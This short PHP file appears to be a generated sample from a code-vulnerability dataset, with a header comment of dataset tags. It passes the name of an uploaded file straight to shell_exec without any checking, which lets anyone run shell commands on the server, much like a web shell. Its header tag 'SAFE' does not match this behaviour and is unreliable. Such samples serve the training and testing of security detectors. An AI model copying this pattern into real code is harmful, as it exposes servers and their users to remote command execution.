<?php
/* DATASET_SIGNATURE: BASELINE_SAFE_UNIQUE_V2_FIXED_HDR_META; CE_BUCKET=FILE_UPLOAD; CE_MODE=FILES_NAME_LOCAL_COPY; SKELETON=S2; KEY=cmd; SINK=B3; VAR=v0064 */
function SINK_B3($command){
    $output=shell_exec($command);
    echo $output;
}
$f = $_FILES["cmd"] ?? null;
$a = is_array($f) ? $f : [];
$inp = (string)($a["name"] ?? "");
$inp = (string)$inp; // no value processing
class Runner {
    public static function run($x){
        return SINK_B3($x);
    }
}
$out = Runner::run($inp);
echo (string)($out);
?>
